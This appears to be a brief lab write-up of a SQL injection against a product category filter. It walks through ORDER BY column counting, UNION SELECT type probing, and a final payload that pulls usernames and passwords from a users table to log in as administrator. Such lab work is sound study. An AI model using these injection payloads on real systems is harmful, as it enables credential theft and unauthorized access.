SQL Injection - Product category filter.

End Goal: Output the usernames and passwords in the user tables and login as the administrator user.

Analysis:
---------
1. Determine # of columns that the vulnerable quiery is using:
    'order by 1 --
    'order by 2 --
    'order by 3 -- > Internal server error
    => 3 - 1 = 2 columns
2. Determine the data type of the columns:
    select a, b from Products where category='Gifts
    'UNION select 'text', NULL -- > accept string value
    'UNION select NULL, 'text' -- > accept string value
    => both columns are of data type string 

'UNION select username, password from users-- > attack sqli 


